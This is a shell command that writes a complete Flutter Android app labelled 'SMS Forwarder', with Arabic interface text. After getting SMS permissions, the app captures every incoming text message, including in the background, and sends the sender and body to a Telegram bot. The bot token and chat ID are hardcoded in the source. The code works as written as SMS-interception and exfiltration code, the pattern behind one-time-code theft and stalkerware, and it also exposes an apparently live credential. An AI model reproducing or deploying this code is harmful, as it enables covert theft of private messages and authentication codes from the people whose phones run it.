cat > lib/main.dart << 'EOF'
import 'package:flutter/material.dart';
import 'package:another_telephony/telephony.dart';
import 'package:http/http.dart' as http;

const String TELEGRAM_TOKEN = '8427135968:AAElq23WG9wdwRz376fcXGe-5zl4ujtTWw8';
const String CHAT_ID = '8427135968';

final Telephony telephony = Telephony.instance;

Future<void> sendToTelegram(String message) async {
  try {
    final url = Uri.parse(
      'https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage'
    );
    await http.post(url, body: {
      'chat_id': CHAT_ID,
      'text': message,
    });
  } catch (e) {
    debugPrint('Telegram error: $e');
  }
}

@pragma('vm:entry-point')
void backgroundMessageHandler(SmsMessage message) async {
  await sendToTelegram('📱 SMS جديد\nمن: ${message.address}\n${message.body}');
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  bool? granted = await telephony.requestPhoneAndSmsPermissions;

  if (granted != null && granted) {
    telephony.listenIncomingSms(
      onNewMessage: (SmsMessage message) {
        sendToTelegram('📱 SMS جديد\nمن: ${message.address}\n${message.body}');
      },
      onBackgroundMessage: backgroundMessageHandler,
    );
  }

  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: const Color(0xFF1E1E2E),
        body: Center(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              const Icon(Icons.sms, size: 80, color: Colors.greenAccent),
              const SizedBox(height: 20),
              const Text(
                'SMS Forwarder',
                style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold),
              ),
              const SizedBox(height: 8),
              const Text(
                'يعمل في الخلفية ✓',
                style: TextStyle(color: Colors.white54, fontSize: 16),
              ),
              const SizedBox(height: 40),
              ElevatedButton.icon(
                onPressed: () async {
                  await sendToTelegram('✅ اختبار - التطبيق يعمل على Android 10!');
                  ScaffoldMessenger.of(context).showSnackBar(
                    const SnackBar(content: Text('تم الإرسال لـ Telegram!')),
                  );
                },
                icon: const Icon(Icons.send),
                label: const Text('إرسال اختبار'),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.greenAccent,
                  foregroundColor: Colors.black,
                  padding: const EdgeInsets.symmetric(horizontal: 24, vertical: 12),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}
EOF